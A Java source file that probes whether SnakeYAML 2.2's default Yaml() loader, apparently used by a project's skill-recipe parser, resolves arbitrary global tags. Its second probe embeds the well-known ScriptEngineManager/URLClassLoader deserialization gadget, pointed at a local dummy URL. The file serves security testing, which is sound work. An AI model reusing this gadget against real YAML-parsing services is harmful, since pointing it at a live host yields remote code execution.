import org.yaml.snakeyaml.Yaml;
import java.util.Map;

/**
 * Probes whether SnakeYAML 2.2's no-arg Yaml() (exactly what
 * UserSkillLoader.parse() uses) still resolves arbitrary global tags
 * to arbitrary Java classes -- i.e. unsafe deserialization.
 */
public class YamlProbe {
    public static void main(String[] args) {
        // 1. Baseline: does a normal recipe parse? (should succeed)
        String benign =
            "id: demo\n" +
            "name: Demo\n" +
            "steps:\n" +
            "  - tool: open_app\n";
        try {
            Object o = new Yaml().load(benign);
            System.out.println("[1] benign recipe parsed -> " + (o instanceof Map ? "Map OK" : o.getClass()));
        } catch (Throwable t) {
            System.out.println("[1] benign recipe FAILED -> " + t.getClass().getName() + ": " + t.getMessage());
        }

        // 2. Probe 1: javax.script.ScriptEngineManager (classic SnakeYAML gadget,
        //    resolves a ScriptEngine -> executes code through the service loader)
        String p1 =
            "id: pwn\n" +
            "name: pwn\n" +
            "steps:\n" +
            "  - tool: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:1/\"]]]]\n";
        try {
            Object o = new Yaml().load(p1);
            System.out.println("[2] !!ScriptEngineManager RESOLVED -> " + o.getClass().getName()
                + "   *** ARBITRARY CLASS INSTANTIATION CONFIRMED ***");
        } catch (Throwable t) {
            System.out.println("[2] !!ScriptEngineManager blocked -> " + t.getClass().getName()
                + ": " + String.valueOf(t.getMessage()).split("\n")[0]);
        }

        // 3. Probe 2: java.net.URL -- simplest possible tag, proves tag resolution
        //    is not restricted to a safe allowlist.
        String p2 =
            "id: pwn2\n" +
            "name: pwn2\n" +
            "steps:\n" +
            "  - tool: !!java.net.URL [\"http://127.0.0.1:9527/api/llm\"]\n";
        try {
            Object o = new Yaml().load(p2);
            System.out.println("[3] !!java.net.URL RESOLVED -> " + o.getClass().getName()
                + " value=" + o);
        } catch (Throwable t) {
            System.out.println("[3] !!java.net.URL blocked -> " + t.getClass().getName()
                + ": " + String.valueOf(t.getMessage()).split("\n")[0]);
        }

        // 4. Probe 3: does it work when the tag is the whole document root, which is
        //    the shape UserSkillLoader actually parses?
        try {
            Object o = new Yaml().load("!!java.util.HashMap {a: 1}");
            System.out.println("[4] root-tag HashMap parsed -> " + o.getClass().getName());
        } catch (Throwable t) {
            System.out.println("[4] root-tag blocked -> " + t.getClass().getName());
        }
    }
}
